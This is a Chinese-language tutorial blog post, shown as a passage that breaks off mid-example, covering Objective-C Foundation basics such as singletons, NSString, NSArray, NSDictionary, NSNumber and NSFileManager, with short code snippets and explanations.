<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//以Person类为例子</div><div class="line">+ (instancetype)sharedPerson;</div><div class="line">+ (instancetype)defaultPerson;</div><div class="line"></div><div class="line">+ (instancetype)sharedPerson&#123;</div><div class="line">  return [self new];</div><div class="line">&#125;</div><div class="line">+ (instancetype)defaultPerson&#123;</div><div class="line">  return [self new];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>5.什么时候需要让类变成单例</p>
<p>比如要做一个游戏的面板的尺寸，如果直接写就把程序写死，宏在程序运行的时候无法更改</p>
<p>如果程序需要被整个程序共享，将数据以属性的方式存储在单例对象中，也就是说在A类中改了尺寸，B类访问的时候就是那个修改过的，因为只有一个对象。</p>
<h2 id="NSString字符串"><a href="#NSString字符串" class="headerlink" title="NSString字符串"></a>NSString字符串</h2><p>NSString是一个不可变的字符串，所以只有增、查、其他方法。</p>
<p>1.构造方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">initWithUTF8String: //将C语言字符串转换为OC字符串，因为OC没有输入函数，所以如果要读入字符串要用这种方法转换</div><div class="line">initWithFormat:  //</div><div class="line">initWithContentsOfURL: //</div><div class="line">initWithContentsOfFile: 文件路径 encoding: 文件编码 error: 错误信息，先使用 nil//从文件中获取字符串</div><div class="line">//文件编码在mac上默认使用utf-8，或者用4</div></pre></td></tr></table></figure>
<p>2.文件编码</p>
<p>早期的计算机用的是纸带打点，为了解释他们的意思，于是对数据进行了编码，当时由于计算机的内存比较小，所以只用了七个二进制位，也就是128个字符，被称作ASCII码，前三十二个字符是控制字符。</p>
<p>后来IBM把七个二进制位扩展到了一个字节，但是只能在早期的长城机和IBM机上才能看到。</p>
<p>随着计算机的普及，亚洲区域一些非英语使用者的国家，显然ASCII码不够用，于是采用了双字节编码：Unicode ，也就是utf-16，有65535个字符，基本把全世界常用的都包括了进来。</p>
<p>utf其他格式最流行的就是utf-8格式，所有的汉字是三个字节，英文是一个字节，现在的网站大部分都是utf-8格式。</p>
<p>3.构造方法详解：</p>
<blockquote>
<p>读取文件：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">int main()&#123;</div><div class="line">    NSError *err;</div><div class="line">    NSString *file = [[NSString alloc] initWithContentsOfFile:@&quot;/Users/peterpan/Downloads/MARKDOWN_FORMAT_URLS.txt&quot; encoding:NSUTF8StringEncoding error:&amp;err];</div><div class="line">  //如果文件不存在，err中存放的的是错误的信息，如果文件存在，err中就没有数据</div><div class="line">  //如果正确，err中就是null也就是0</div><div class="line">  //如果出现了错误，err中就会被赋值，它就会指向一个错误的对象</div><div class="line">  	if(!err)&#123;</div><div class="line">    NSLog(@&quot;%@&quot;,file);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">//函数参数是值传递，那么参数和外界变量之间没有关系</div><div class="line">//函数参数如果是引用传递，函数内和函数外访问的是同一个变量。</div></pre></td></tr></table></figure>
<p>用一个内存图来方便理解</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-28%20%E4%B8%8B%E5%8D%884.30.01.png" alt="屏幕快照 2017-06-28 下午4.30.01.png" title="" class="">
                <p>屏幕快照 2017-06-28 下午4.30.01.png</p>
            </figure>
<p>总结的来说，想从文件中读取数据，需要三个参数：文件的路径、文件的编码格式、错误信息对象的指针（容器，如果出现了错误，在方法中会生成一个错误对象，赋值给该容器，如果没有出现读取错误，那么就正常执行返回读取的数据）</p>
<blockquote>
<p><strong>读取URL：</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">NSError *err;</div><div class="line">NSString *html = [[NSString alloc] initWithContentsOfURL:[[NSURL alloc]initWithString:@&quot;http://www.douyu.com&quot;] encoding:4 error:&amp;err];</div><div class="line">if(!err)&#123;</div><div class="line">        NSLog(@&quot;%@&quot;,html);</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<blockquote>
<p><strong>格式化字符串</strong></p>
</blockquote>
<p>就是利用格式生成一个字符串并返回，NSLog就是格式化输出，利用格式生成字符串，直接打印出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NSString *x = @&quot;hello&quot;;</div><div class="line">NSString *str = [[NSString alloc] initWithFormat:@&quot;%@&quot;,x];</div></pre></td></tr></table></figure>
<blockquote>
<p><strong>转换C语言字符串为OC字符串</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">//写一个输入OC字符串的函数</div><div class="line">NSString *inputString()&#123;</div><div class="line">  char arr[256];</div><div class="line">  int length = 0;</div><div class="line">  //OC中没有输入函数，要调用C语言中的</div><div class="line">  //因为scanf不能识别空格，所以要用getchar</div><div class="line">  //getchar()函数，是从输入流中获取一个字符，并返回其ASCII码（字符）</div><div class="line">  while((ch = getchar())!=&apos;\n&apos;)&#123;</div><div class="line">   		arr[length] = ch;</div><div class="line">    	length++;</div><div class="line">  	&#125;</div><div class="line">  arr[length] = &apos;\0&apos;;</div><div class="line">  return [[NSString alloc] initWithUTF8String:arr];</div><div class="line">&#125;</div><div class="line">//最后可以把它封装成一个类的类方法</div></pre></td></tr></table></figure>
<blockquote>
<p>字符串比较方法</p>
</blockquote>
<p>OC中NSString提供的两种方法</p>
<blockquote>
<p>isEqualToString    返回值是BOOL类型</p>
<p>compare</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//为了让比较的结果更加的形象,封装一个函数</div><div class="line">NSString *NSStringFromBOOL(BOOL isTrue)&#123;</div><div class="line">  return isTrue ? @&quot;YES&quot; : @&quot;NO&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//compare方法返回的是一个枚举类型</div><div class="line">NSString *s1 = @&quot;123&quot;;</div><div class="line"></div><div class="line">NSComparisonResult res = [s1 compare:@&quot;40&quot;];</div><div class="line">//还可以给比较的方法加参数来满足不同的需求,下面这意思就是忽略大小写的比较</div><div class="line">NSComparisonResult res = [s1 compare:@&quot;40&quot; options:NSCaseInsensitiveSearch];</div><div class="line">//比较字符串中的数字，例如f1.txt和f2.txt</div><div class="line">NSComparisonResult res = [file compare:html options:NSNumericSearch];</div><div class="line">NSLog(@&quot;%ld&quot;, res);</div></pre></td></tr></table></figure>
<blockquote>
<p>字符串开头结尾判断</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">BOOL pre = [str hasPrefix:@&quot;http://&quot;];   //判断前缀，返回值是BOOL类型</div><div class="line">BOOL res = [str hasSuffix:@&quot;.com&quot;];    //判断结尾，也是BOOl类型的返回值</div></pre></td></tr></table></figure>
<blockquote>
<p>在主串中搜寻子串</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">//NSRange结构体</div><div class="line">typedef struct _NSRange &#123;</div><div class="line">    NSUInteger location;   //代表子串在主串中出现的下标，如果没有找到就是最大值</div><div class="line">    NSUInteger length;     //代表子串在主串中匹配的长度</div><div class="line">&#125; NSRange;    </div><div class="line"></div><div class="line">NSString *str = @&quot;jack&quot;;</div><div class="line">NSRange range = [str rangeOfString:@&quot;j&quot;];</div><div class="line">if(range.location == NSNotFound)&#123;</div><div class="line">  NSLog(@&quot;没有找到&quot;);   //NSNotFound定义为最大值</div><div class="line">&#125;</div><div class="line">//然后可以通过&apos;range.xxx&apos;来输出我们想要的数据</div><div class="line">//改变搜索的顺序</div><div class="line">NSRange range = [str rangeOfString:@&quot;sa&quot; options:NSBackwardsSearch];</div></pre></td></tr></table></figure>
<blockquote>
<p>快速声明，打印一个结构体</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//初始化结构体变量,下面这个方法会返回一个指定属性的结构体变量</div><div class="line">NSRange ran = NSMakeRange(3, 7);</div><div class="line">//将结构体变量转换为一个字符串</div><div class="line">NSLog(@&quot;%@&quot;, NSStringFromRange(ran));</div></pre></td></tr></table></figure>
<blockquote>
<p>字符串截取</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//从下标为3的字符开始截取一直到最后</div><div class="line">NSString *str1 = [str subStringFromIndex:3];</div><div class="line">//从开始字符截取3个</div><div class="line">NSString *str1 = [str subStringToIndex:3];</div><div class="line">//截取中间的一段,从下标为2的字符开始截取三个</div><div class="line">NSString *str1 = [str subStringWithRange:NSMakeRange(2,3)];</div></pre></td></tr></table></figure>
<blockquote>
<p>字符串的替换</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//将str字符串中的123替换为456,原来的指针指向的字符串的内容是不会改变的，而且替换是全部替换，这个还可以做删除，就是替换为空字符串</div><div class="line">str = [str stringByReplacingOccurrencesOfString:@&quot;123&quot; withString:@&quot;456&quot;];</div></pre></td></tr></table></figure>
<blockquote>
<p>字符串类型转换</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NSString *str = @&quot;12&quot;;</div><div class="line">//转换为整型，当然也可以转换为浮点数等，但是在转换的时候只有数字才能转换，遇到第一个非数字结束转换</div><div class="line">int num = str.intValue;</div></pre></td></tr></table></figure>
<blockquote>
<p>去掉字符串中的特殊字符</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">NSString *str = @&quot;   as   &quot;;</div><div class="line">//去掉空格</div><div class="line">str = [str stringByTrimmingCharactersInSet:[NSCharacterSet   whitespaceCharacterSet]];</div><div class="line">//去掉大写字符</div><div class="line">str = [str stringByTrimmingCharactersInSet:[NSCharacterSet uppercaseLetterCharacterSet]];</div><div class="line">//去掉指定字符串</div><div class="line">str = [str stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@&quot;asdsa&quot;]];</div></pre></td></tr></table></figure>
<blockquote>
<p>大小写转换</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">NSSString *str = @&quot;test&quot;;</div><div class="line">str = [str uppercaseString];</div><div class="line">str = [str lowercaseString];</div></pre></td></tr></table></figure>
<h2 id="NSMutableString字符串"><a href="#NSMutableString字符串" class="headerlink" title="NSMutableString字符串"></a>NSMutableString字符串</h2><blockquote>
<p>字符串的恒定性</p>
</blockquote>
<p>一旦创建一个字符串对象，那么这个字符串对象的内容就无法更改，我们修改字符串的时候，其实是重新创建了一个字符串对象，所以如果需要频繁的修改一个字符串，可以将其定义为NSMutableString，NSMutableString在父类NSString的基础之上做了扩展，存储在其中的字符串具有可变性，不会新创建对象。</p>
<blockquote>
<p>NSMutableString用法</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//直接追加字符串</div><div class="line">NSMutableString *str = [NSMutableString string];</div><div class="line">[str appendString:@&quot;sasa&quot;];</div><div class="line">//以拼接的方式追加内容</div><div class="line">int num = 1;</div><div class="line">[str appendFormat:@&quot;%d&quot;, num];</div><div class="line">//创建对象的时候，下面这种初始化方式是不行的</div><div class="line">NSMutableString *str = @&quot;hello&quot;;</div><div class="line">//因为@&quot;hello&quot;是一个NSString对象，子类指针指向父类对象，如果调用子类独有的方法就会运行出错。</div><div class="line">//剩下的因为继承的关系，和NSString的方法一致</div></pre></td></tr></table></figure>
<h2 id="NSArray数组"><a href="#NSArray数组" class="headerlink" title="NSArray数组"></a>NSArray数组</h2><p>特点是只能存储OC对象，长度固定，一旦NSArray数组创建完毕之后，无法新增和删除，元素的类型是id类型的</p>
<blockquote>
<p>初始化方法</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//通过下面方法创建的数组长度为0，没有意义</div><div class="line">NSArray *arr1 = [NSArray new];</div><div class="line">NSArray *arr2 = [NSArray array];</div><div class="line">NSArray *arr3 = [[NSArray alloc] init];</div><div class="line">//常用的方式</div><div class="line">NSArray *arr = [NSArray arrayWithObjects:@&quot;s&quot;, @&quot;s&quot;, nil];//结尾要加nil,表示元素到此结束</div><div class="line">NSArray *arr = @[@&quot;s&quot;, @&quot;s&quot;]; //这种方式就是上面的简化版，不需要加nil</div></pre></td></tr></table></figure>
<blockquote>
<p>使用方法</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//可以用下标访问数组中所有的元素,如果下标越界会直接报错</div><div class="line">NSLog(@&quot;%@&quot;, arr[0]);</div><div class="line">//得到元素个数</div><div class="line">arr.count</div><div class="line">//判断是否含有某个元素,返回值为BOOL类型</div><div class="line">[arr containsObject:@&quot;hello&quot;];  </div><div class="line">//查找指定元素在数组中第一次出现的下标</div><div class="line">[arr indexOfObject:@&quot;jack&quot;];</div><div class="line">//得到数组首尾元素，这种方法如果数组为空不会报错，只会返回nil</div><div class="line">arr.firstObject</div><div class="line">//根据返回数组元素</div><div class="line">[arr objectAtIndex:1];</div></pre></td></tr></table></figure>
<blockquote>
<p>遍历方法</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">//通常遍历方法</div><div class="line">for(int i = 0;i &lt; arr.count;i++)</div><div class="line">//迭代遍历法，迭代变量的类型和数组元素的类型保持一致</div><div class="line">for(NSString *str in arr)</div><div class="line">//使用block遍历,可以在代码块中进行自定义的输出，idx是下标，如果想停止遍历，就将stop指针指向YES</div><div class="line">  [arr enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) &#123;</div><div class="line">        NSLog(@&quot;%@&quot;, obj);</div><div class="line">    	if(idx==2)</div><div class="line">          *stop = YES;</div><div class="line">    &#125;];</div></pre></td></tr></table></figure>
<blockquote>
<p>字符串与数组</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//将数组元素和字符串连接起来</div><div class="line">NSString *str =  [arr componentsJoinedByString:@&quot;#&quot;];</div><div class="line">//将字符串转换为数组,以‘,’作为分隔</div><div class="line">NSArray *arr = [str componentsSeparatedByString:@&quot;,&quot;];</div></pre></td></tr></table></figure>
<h2 id="NSMutableArray数组"><a href="#NSMutableArray数组" class="headerlink" title="NSMutableArray数组"></a>NSMutableArray数组</h2><p>NSMutableArray仍然是一个数组，具备NSArray的特点，但是相对于父类做了扩展，NSMutableArray数组的元素可以动态的新增或者删掉，其他用法和NSArray一致。</p>
<p>数组的创建可以参考NSSMutableArray</p>
<p>可变数组添加元素的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">NSMutableArray *arr = [NSMutableArray new];</div><div class="line">[arr addObject:@&quot;test&quot;];</div><div class="line">//将另一个数组作为可变数组的一个元素</div><div class="line">[arr addObject:arr1];</div><div class="line">//将另一个数组中的元素加进来</div><div class="line">[arr addObjectFromArray:arr1];</div><div class="line">//在可变数组指定的下标处加入一个元素</div><div class="line">[arr insertObject:@&quot;test&quot; atIndex:1];</div><div class="line">//删除指定下标的值</div><div class="line">[arr removeObjectAtIndex:1];</div><div class="line">//删除可变数组中所有的指定元素</div><div class="line">[arr removeObject@&quot;test&quot;];</div><div class="line">//删除指定范围内的元素</div><div class="line">[arr removeObject:@&quot;test&quot; inRange:NSMakeRange(0,3)];</div><div class="line">//删除最后一个元素</div><div class="line">[arr removeLastObject]</div><div class="line">//删除所有元素</div><div class="line">[arr removeAllObjects];</div></pre></td></tr></table></figure>
<h2 id="NSNumber"><a href="#NSNumber" class="headerlink" title="NSNumber"></a>NSNumber</h2><p>NSArray和NSMutableArray都只能存储OC对象，不能存储基本数据类型，NSNumber是Foundation框架中定义好的一个类，这个类的作用就是用来包装基本数据类型。</p>
<blockquote>
<p>基本数据类型存储到数组中的步骤</p>
</blockquote>
<p>1.先将基本数据类型包装到NSNumber对象中</p>
<p>2.将NSNumber对象存储到NSArray数组中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">NSNumber *number = [NSNumber numberWithFloat:10.1f];</div><div class="line">NSArray *arr = @[number];</div><div class="line">//简写方式</div><div class="line">NSNumber *number1 = @10;</div><div class="line">//@10代表这个对象中包装的是整型数据10</div><div class="line">NSArray *arr1 = @[@10,@20,@30];</div><div class="line">//注意，如果后面的数据是一个变量，就要用小括弧扩起来</div><div class="line">int num  = 10;</div><div class="line">NSNumber *number2 = @(num);</div></pre></td></tr></table></figure>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>实现数组的数据持久化，因为程序执行完之后，内存就回来被释放，所以可以把数组中的元素写入文件中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NSArray *arr = @[@&quot;test&quot;, @10];</div><div class="line">[arr writeToFile:@&quot;/Users/peterpan/Desktop/test.plist&quot;];</div></pre></td></tr></table></figure>
<p>然后下次想要调用的时候就可以直接从plist文件中读取：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">NSArray *arr = [NSArray arrayWithContentsOfFile:@&quot;/Users/peterpan/Desktop/test.plist&quot;];</div></pre></td></tr></table></figure>
<h2 id="NSDictionary"><a href="#NSDictionary" class="headerlink" title="NSDictionary"></a>NSDictionary</h2><p>NSArray和NSMutableArray都可以存储数据，但是缺点是数组元素的下标不固定，无法通过下标来确定唯一数组中的元素，所以我们希望有一种存储方式，存储到数组当中，可以快速唯一的确定数组的元素。</p>
<p>存储数据的时候，要为存储的数据取一个别名，用来确定这个别名对应的数据。</p>
<p>这种存储数据的方式就叫做键值对的存储方式 </p>
<blockquote>
<p>创建字典数组</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//如果只是简单初始化，此时字典数组中没有任何元素，没有意义</div><div class="line">NSDictionary *dict = [NSDictionary new];</div><div class="line">//一般创建方式</div><div class="line">NSDictionary *dict = [NSDictionary dictionaryWithObjectsAndKeys:@&quot;jack&quot;,@&quot;name&quot;,@&quot;北京市&quot;,@&quot;address&quot;, nil];</div><div class="line">//简要创建方式</div><div class="line">NSDictionary *dict = @&#123;@&quot;name&quot;:@&quot;jack&quot;,@&quot;age&quot;:@&quot;18&quot;&#125;;</div></pre></td></tr></table></figure>
<blockquote>
<p>存储数据的原理</p>
</blockquote>
<p>1.以键值对的形式存储数据</p>
<p>2.字典数组一旦创建，其中的元素不能动态的新增和删除</p>
<p>3.键：只能是遵守了NSCoping协议的对象,而NSString就是遵守了这个协议</p>
<p>   值：只能是OC对象</p>
<p>4.当往字典数组中存入一个键值对的时候，并不是按照顺序挨个存储，而是根据键和数组的长度做一个哈希算法算出一个下标，再将这个键值对存入这个下标对应的空间。</p>
<p>5.取值的时候，也可以通过键做一个哈希算法，算出下标，然后直接找到对应的数据取出即可</p>
<blockquote>
<p>字典数组的使用</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//取出存储在字典数组中的数据</div><div class="line">//使用中括弧的方式</div><div class="line">NSLog(@&quot;%@&quot;,dict[@&quot;name&quot;]);</div><div class="line">//使用字典数组对象的方法,如果给定的key在数组中不存在，取到的值就是nil，不会报错</div><div class="line">NSString *name = [dict objectForKey:@&quot;name&quot;];</div><div class="line">//取到字典数组键值对的个数</div><div class="line">dict.count</div><div class="line">//在向字典数组中存储键值对的时候，键不允许重复，若重复后加的就无效</div></pre></td></tr></table></figure>
<blockquote>
<p>字典的遍历</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//这样方法遍历出来的是字典中所有的键</div><div class="line">for(id item in dict)&#123;</div><div class="line">  NSLog(@&quot;%@ = %@&quot;, item, dict[item]);</div><div class="line">&#125;</div><div class="line">//使用block</div><div class="line">[dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) &#123;</div><div class="line">        NSLog(@&quot;%@ = %@&quot;, key, obj);</div><div class="line">    &#125;];</div></pre></td></tr></table></figure>
<p><strong>和NSArray对比，存储数据的效率是NSArray更高，不需要进行计算；在取数据的时候，如果是全部取出来，也是NSArray的效率更高，但是如果是取出指定的几个的数据，就是NSDictionary了，因为不需要遍历。</strong></p>
<h2 id="NSMutableDictionary"><a href="#NSMutableDictionary" class="headerlink" title="NSMutableDictionary"></a>NSMutableDictionary</h2><p>键值对可以动态的的新增、删除，其他的用法和其父类一致，只是注意子类指针不要指向父类对象</p>
<p>新增和删除键值对</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//新增，如果添加的键有重复，后添加的就会覆盖原有的</div><div class="line">[dict setObject:@&quot;jack&quot; forKey:@&quot;name&quot;];</div><div class="line">//删除所有键值对</div><div class="line">[dict removeAllObjects];</div><div class="line">//根据键来删除</div><div class="line">[dict removeObjectForKey:@&quot;age&quot;];</div></pre></td></tr></table></figure>
<p>字典数组的持久化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[dict writeToFile:@&quot;/Users/peterpan/Downloads/dict.plist&quot; atomically:NO];</div><div class="line">//从plist文件中读取</div><div class="line">NSDictionary *dict = [NSDictionary dictWithContentsOfFile@&quot;/Users/peterpan/Downloads/dict.plist&quot;];</div></pre></td></tr></table></figure>
<h2 id="集合的内存管理"><a href="#集合的内存管理" class="headerlink" title="集合的内存管理"></a>集合的内存管理</h2><p>1.MRC模式下，将对象存储到集合中，会为这个对象的引用计数器加一，集合销毁的时候，会向其中所有的对象发送一条release消息。</p>
<p>2.使用@[]或@{}创建的集合是已经被autorelease过的，直接调用和类同名的类方法创建的对象也是。</p>
<p>3.在ARC的模式下，集合的元素是一个强类型的指针。</p>
<h2 id="NSFileManager"><a href="#NSFileManager" class="headerlink" title="NSFileManager"></a>NSFileManager</h2><p>这个类的对象是以单例模式创建的，调用其类方法就可以得到其单例对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">NSFileManager *manager = [NSFileManager defaultManager];</div></pre></td></tr></table></figure>
<p>常用判断方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//判断文件夹或文件是否存在,返回值为BOOL类型</div><div class="line">[manager fileExistAtPath:@&quot;/Users/peterpan/test.py&quot;];</div><div class="line">//判断指定的路径是否真实存储在我们的磁盘上，并且判断这个路径是一个文件夹还是文件</div><div class="line">BOOL flag = NO;</div><div class="line">//执行完后，如果flag是YES，那么给定路径是一个文件夹路径，否则就是文件路径</div><div class="line">[manager fileExistAtPath:@&quot;/Users/peterpan/test.py&quot; isDirectory:&amp;flag];</div><div class="line">//判断指定的文件或文件夹是否可以读取</div><div class="line">[manager isReadableFileAtPath:@&quot;/Users/peterpan/test.py&quot;];</div><div class="line">//判断指定的文件或文件夹是否可以写入</div><div class="line">[manager isWritableFileAtPath:@&quot;/Users/peterpan/test.py&quot;];</div><div class="line">//判断指定的文件或文件夹是否可以删除</div><div class="line">[manager isDeletableFilePath:@&quot;/Users/peterpan/test.py&quot;];</div></pre></td></tr></table></figure>
<p>常用获取信息方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">//拿到这个文件的属性信息，可以通过key拿到指定信息</div><div class="line">[manager attributesOfItemAtPath:@&quot;/Users/peterpan/test.py&quot; error:nil];</div><div class="line">NSLog(@&quot;%@&quot;, dict[NSFileSize]);</div><div class="line">//获取指定目录下所有的文件和目录，包括子目录的子目录...</div><div class="line">NSArray *arr = [manager subpathAtPath:@&quot;/Users/peterpan&quot;];</div><div class="line">//获取指定文件夹的所有子文件和子目录，不包括继续下层的目录和文件</div><div class="line">NSArray *arr = [manager contentsOfFileAtPath:@&quot;／Users/mac/Desktop&quot;];</div></pre></td></tr></table></figure>
<p>常用操控方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">//存储在磁盘上的任何文件都是以二进制的形式存储的</div><div class="line">//第二个参数是文件的内容，要求是文件的二进制内容,第三个参数可以自定义文件的属性</div><div class="line">//NSData对象就是专门用来保护二进制数据的</div><div class="line">NSString *str1 = @&quot;saaasaxas&quot;;</div><div class="line">    NSData *data = [str dataUsingEncoding:NSUTF8StringEncoding];</div><div class="line">    NSFileManager *manager = [NSFileManager new];</div><div class="line">    BOOL res = [manager createFileAtPath:@&quot;/Users/peterpan/test.txt&quot; contents:data attributes:nil];</div><div class="line">//在指定目录下创建文件夹，第二个参数是是否允许一路创建，第三个属性是指定属性</div><div class="line"> [manager createDirectoryAtPath:@&quot;/Users/peterpan/test&quot; withIntermediateDirectories:YES attributes:nil error:nil];</div><div class="line">//拷贝文件</div><div class="line">[manager copyItemAtPath:@&quot;xxx&quot; 